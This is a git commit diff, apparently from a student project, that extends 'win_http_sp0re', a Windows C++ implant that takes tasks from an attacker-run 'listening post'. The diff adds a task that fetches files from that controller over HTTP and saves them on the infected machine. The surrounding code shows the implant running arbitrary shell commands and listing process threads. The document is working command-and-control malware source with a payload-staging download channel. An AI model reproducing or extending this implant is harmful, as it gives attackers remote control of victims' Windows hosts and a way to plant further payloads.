2018df61e00705e13d50a86e3feb723fe78abe70
Dalton Brown <dbrown70@students.towson.edu>
2021-04-26 00:18:55 -0400

    upload function implemented for http_win_sp0re

--- win_http_sp0re/win_http_sp0re/tasks.cpp
+++ win_http_sp0re/win_http_sp0re/tasks.cpp
@@ -13,16 +13,25 @@
 
 #include <string>
 #include <array>
+#include <iostream>
 #include <sstream>
 #include <fstream>
 #include <cstdlib>
 
 #include <boost/uuid/uuid_io.hpp>
 #include <boost/property_tree/ptree.hpp>
+#include <boost/property_tree/json_parser.hpp>
+#include <boost/filesystem.hpp>
+#include <nlohmann/json.hpp>
 
+#include <stdio.h>
+#include <stdlib.h>
 #include <Windows.h>
 #include <tlhelp32.h>
+#include <cpr/cpr.h>
 
+using namespace boost::filesystem;
+using json = nlohmann::json;
 
 // Function to parse the tasks from the property tree returned by the listening post
 // Execute each task according to the key specified (e.g. Got task_type of "ping"? Run the PingTask)
@@ -68,6 +77,14 @@
             taskTree.get_child("procid").get_value<std::string>()
         };
     }
+    if (taskType == DownloadFileTask::key) {
+        return DownloadFileTask{
+            id,
+            agent_id,
+            taskTree.get_child("filename").get_value<std::string>(),
+            taskTree.get_child("save_as").get_value<std::string>()
+        };
+    }
 
     // ===========================================================================================
 
@@ -90,7 +107,7 @@ Configuration::Configuration(const double meanDwell, const bool isRunning, const
 PingTask::PingTask(const boost::uuids::uuid& id, const std::string agent_id)
     : id{ id } {}
 
-Result PingTask::run() const {
+Result PingTask::run(std::string host, std::string port) const {
     const auto pingResult = "PONG!";
     return Result{ id, agent_id, pingResult, true };
 }
@@ -109,7 +126,7 @@ ConfigureTask::ConfigureTask(const boost::uuids::uuid& id,
     agent_id{ agent_id },
     setter{ std::move(setter) } {}
 
-Result ConfigureTask::run() const {
+Result ConfigureTask::run(std::string host, std::string port) const {
     // Call setter to set the implant configuration, mean dwell time and running status
     setter(Configuration{ meanDwell, isRunning, agent_id });
     return Result{ id, agent_id, "Configuration successful!", true };
@@ -122,7 +139,7 @@ ExecuteTask::ExecuteTask(const boost::uuids::uuid& id, std::string agent_id, std
     : id{ id },
     command{ std::move(command) } {}
 
-Result ExecuteTask::run() const {
+Result ExecuteTask::run(std::string host, std::string port) const {
     std::string result;
     try {
         std::array<char, 128> buffer{};
@@ -149,7 +166,7 @@ ListThreadsTask::ListThreadsTask(const boost::uuids::uuid& id, std::string agent
     : id{ id },
     processId{ processId } {}
 
-Result ListThreadsTask::run() const {
+Result ListThreadsTask::run(std::string host, std::string port) const {
     try {
         std::stringstream threadList;
         auto ownerProcessId{ 0 };
@@ -208,4 +225,94 @@ Result ListThreadsTask::run() const {
     }
 }
 
+
+// DownloadFileTask
+// -------------------------------------------------------------------------------------------
+DownloadFileTask::DownloadFileTask(const boost::uuids::uuid& id, std::string agent_id, std::string filename, std::string save_as)
+    : id{ id },
+    filename{ filename }, 
+    save_as{ save_as } {}
+
+
+Result DownloadFileTask::run(std::string host, std::string port) const {
+    std::string file = "";
+    try {
+        // Split full paths of files into their directories and filenames
+        path remotepath = filename;
+        std::string remotefilename = remotepath.filename().string();
+        std::string remoteparentpath = remotepath.parent_path().string();
+        path localpath = save_as;
+        std::string localfilename = localpath.filename().string();
+        path localparentpath = localpath.parent_path();
+
+        // Construct payload
+        boost::property_tree::ptree ptree;
+        ptree.add("path",remoteparentpath);
+        ptree.add("filename", remotefilename);
+        std::stringstream payload;
+        boost::property_tree::write_json(payload, ptree);
+
+        // Retrieve file from server
+        auto const serverAddress = host;
+        auto const serverPort = port;
+        auto const serverUri = "/files";
+        auto const httpVersion = 11;
+        auto const requestBody = json::parse(payload);
+
+        // Construct our listening post endpoint URL from user args
+        std::stringstream ss;
+        ss << "http://" << serverAddress << ":" << serverPort << serverUri;
+        std::string fullServerUrl = ss.str();
+
+        // Make an asynchronous HTTP GET request to the listening post
+        cpr::AsyncResponse asyncRequest = cpr::GetAsync(cpr::Url{ fullServerUrl },
+            cpr::Body{ requestBody.dump() },
+            cpr::Header{ {"Content-Type", "application/json"} }
+        );
+        // Retrieve the file when it's ready
+        cpr::Response response = asyncRequest.get();
+
+        // Save the file returned by the listening post
+        std::string resp = response.text;
+        if (exists(localparentpath)) {
+            ofstream out(localpath, std::ios::out);
+            out << resp;
+            return Result{ id, agent_id, "File saved as: " + localpath.string(), true };
+        }
+        else { // Edit this to create the directory at some point. (From code below)
+            return Result{ id, agent_id, "Directory does not exist", false };
+        }
+    }
+    catch (const std::exception& e) {
+        return Result{ id, agent_id, e.what(), false };
+    }
+}
+
 // ===========================================================================================
+/*
+// create a file, plus any required directories
+std::ofstream CreateFileAndRequiredDirectories(const std::string& filePath) {	// just to simplify things...	
+    namespace filesystem = boost::filesystem;
+    using boost::filesystem::path;
+    // create a boost path object representing the file path;	
+    path filePathObject(filePath, filesystem::native);
+    if (!filesystem::exists(filePathObject.parent_path())) {		// if the file's parent directory doesn't exist,		
+                                                                    // then we need to do a little more work...		
+        // create a path object to represent the file's parent directory		
+        path dirPath(filePathObject.parent_path(), filesystem::native);		// ...walk through each directory in the parent directory path		
+                                                                            // from root to absolute path and create any parent directories		
+                                                                            // that don't exist yet		
+        path partialPath("", filesystem::native);
+        path::iterator currPath = dirPath.begin();
+        path::iterator endPath = dirPath.end();
+        while (currPath != endPath) {
+            partialPath /= path(*currPath, filesystem::native);
+            if (!filesystem::exists(partialPath)) {
+                filesystem::create_directory(partialPath);
+            }
+            ++currPath;
+        }
+    }
+    return std::ofstream(filePath);
+}
+*/
